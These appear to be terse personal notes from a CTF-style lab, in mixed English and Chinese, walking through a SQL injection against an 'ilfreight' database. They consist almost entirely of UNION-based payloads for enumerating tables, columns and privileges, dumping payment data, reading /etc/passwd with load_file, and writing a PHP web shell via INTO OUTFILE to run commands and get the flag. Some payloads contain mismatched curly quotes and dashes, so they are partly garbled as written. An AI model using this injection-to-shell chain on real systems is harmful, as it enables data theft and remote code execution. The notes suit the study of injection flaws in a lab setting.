1' union select 1,version(),database(),TABLE_NAME,TABLE_SCHEMA from information_schema.tables where table_schema='ilfreight’;-- -
1' union select 1,version(),database(),table_name,Table_schema from information_schema.tables where table_schema='ilfreight';-- -

result : users / payment

1' union select 1,version(),database(),column_name,4 from information_schema.columns where table_name=‘users’;— -

Result -> unknow column

' union select 1,version(), database(), column_name, 4 from information_schema.columns where table_name='payment’;--  -

result -> id name month amount tax 

1' union select 1,current_user(),user(),user from ilfreight.user;-- -

result: ilfreight not exist 

1' union select 1,name,month,amount,tax from ilfreight.payment;— -

Result: Adam (useless)
	    james (useless)


1' union select 1,user(),current_user(),4,5 from ilfreight.user;— -

Result: root@localhost

1' union select 1,grantee,privilege_type,4,5 from information_schema.user_privileges where grantee="'root'@'localhost'";— -

result ： 權限列表

1' union select 1,load_file(“/etc/passwd"),3,4,5;— -

Result: path列表

next: 上傳shell - > '<?php system($_request[0])?>' into outfile '<path>';-- -

next: go shell的路徑 'shell.php?0=id;ls;cd ..;ls;'

get flag ！！！！！！！
